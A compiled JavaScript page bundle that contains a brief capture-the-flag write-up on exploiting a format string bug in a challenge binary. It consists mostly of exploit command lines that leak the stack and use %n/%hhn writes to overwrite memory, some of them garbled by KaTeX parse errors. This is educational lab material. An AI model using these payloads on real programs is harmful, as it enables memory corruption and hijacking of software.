(window.webpackJsonp=window.webpackJsonp||[]).push([[96],{405:function(t,r,x){"use strict";x.r(r);var e=x(8),a=Object(e.a)({},(function(){var t=this,r=t._self._c;return r("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[r("h1",{attrs:{id:"format-string-bug-basic-2-writeup"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#format-string-bug-basic-2-writeup"}},[t._v("#")]),t._v(" Format string bug basic 2 writeup")]),t._v(" "),r("p",[t._v("Used https://www.usna.edu/Users/cs/aviv/classes/si485h/s17/units/06/unit.html as a guide.")]),t._v(" "),r("p",[t._v("First, lets use some simple string to look up into the stack and find our passed in argument.")]),t._v(" "),r("div",{staticClass:"language-sh extra-class"},[r("pre",{pre:!0,attrs:{class:"language-sh"}},[r("code",[t._v("./ch14 "),r("span",{pre:!0,attrs:{class:"token string"}},[t._v('"AAAA %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x"')]),t._v("\n\n"),r("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# returns [AAAA 0x80485f1 00000000 00000000 0x0000c2 0xbffffb74 0xb7fe1409 0xf63d4e2e 0x4030201 0x41414141 0x38783020 0x35383430 0x3020316]")]),t._v("\n"),r("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# at the 0x41414141 we see our AAAA that we put in there")]),t._v("\n")])])]),r("p",[t._v("address we want to write to:\n0x bf ff fa 68")]),t._v(" "),r("p",[t._v('./ch14 $(printf "\\x68\\xfa\\xff\\xbf").%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x')]),t._v(" "),r("p",[t._v("We want to write to the address 0xbffffa68. So we put that address as the very first part of our string so that we can refer to it when popping elements off the stack and writing to that address using %n.")]),t._v(" "),r("p",[t._v('The result is:\n./ch14 $(printf "\\x68\\xfa\\xff\\xbf").%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%n')]),t._v(" "),r("p",[t._v("which yields us with being on the right way.")]),t._v(" "),r("p",[t._v("Since our buffer size at most is 128, we need to do this by doing this cleverly.")]),t._v(" "),r("p",[t._v("./ch14 "),r("span",{staticClass:"katex-error",attrs:{title:'ParseError: KaTeX parse error: Undefined control sequence: \\x at position 10: (printf "\\̲x̲4b\\xfa\\xff\\xbf"…'}},[t._v('(printf "\\x4b\\xfa\\xff\\xbf")')]),t._v('(printf "\\x4a\\xfa\\xff\\xbf")'),r("span",{staticClass:"katex-error",attrs:{title:'ParseError: KaTeX parse error: Undefined control sequence: \\x at position 10: (printf "\\̲x̲49\\xfa\\xff\\xbf"…'}},[t._v('(printf "\\x49\\xfa\\xff\\xbf")')]),t._v('(printf "\\x48\\xfa\\xff\\xbf")%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#146x.%hhn.%hhn')]),t._v(" "),r("p",[t._v("address changed again!\n./ch14 "),r("span",{staticClass:"katex-error",attrs:{title:'ParseError: KaTeX parse error: Undefined control sequence: \\x at position 10: (printf "\\̲x̲4b\\xfa\\xff\\xbf"…'}},[t._v('(printf "\\x4b\\xfa\\xff\\xbf")')]),t._v('(printf "\\x4a\\xfa\\xff\\xbf")'),r("span",{staticClass:"katex-error",attrs:{title:'ParseError: KaTeX parse error: Undefined control sequence: \\x at position 10: (printf "\\̲x̲49\\xfa\\xff\\xbf"…'}},[t._v('(printf "\\x49\\xfa\\xff\\xbf")')]),t._v('(printf "\\x48\\xfa\\xff\\xbf")%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#146x.%hhn.%hhn')]),t._v(" "),r("p",[t._v("./ch14 "),r("span",{staticClass:"katex-error",attrs:{title:'ParseError: KaTeX parse error: Undefined control sequence: \\x at position 10: (printf "\\̲x̲4b\\xfa\\xff\\xbf"…'}},[t._v('(printf "\\x4b\\xfa\\xff\\xbf")')]),t._v('(printf "\\x4a\\xfa\\xff\\xbf")'),r("span",{staticClass:"katex-error",attrs:{title:'ParseError: KaTeX parse error: Undefined control sequence: \\x at position 10: (printf "\\̲x̲49\\xfa\\xff\\xbf"…'}},[t._v('(printf "\\x49\\xfa\\xff\\xbf")')]),t._v('(printf "\\x48\\xfa\\xff\\xbf").%1$07x.%9$hhn.%1$08x.%\\10$hhn.%1$08x.%\\11$hhn.%1$08x.%\\12$hhn')]),t._v(" "),r("p",[t._v("./ch14 "),r("span",{staticClass:"katex-error",attrs:{title:'ParseError: KaTeX parse error: Undefined control sequence: \\x at position 10: (printf "\\̲x̲4b\\xfa\\xff\\xbf"…'}},[t._v('(printf "\\x4b\\xfa\\xff\\xbf")')]),t._v('(printf "\\x4a\\xfa\\xff\\xbf")'),r("span",{staticClass:"katex-error",attrs:{title:'ParseError: KaTeX parse error: Undefined control sequence: \\x at position 10: (printf "\\̲x̲49\\xfa\\xff\\xbf"…'}},[t._v('(printf "\\x49\\xfa\\xff\\xbf")')]),t._v('(printf "\\x48\\xfa\\xff\\xbf").%1$204x.%9$hhn.%1$205x.%\\10$hhn.%1$15x.%\\11$hhn.%1$47x.%\\12$hhn')])])}),[],!1,null,null,null);r.default=a.exports}}]);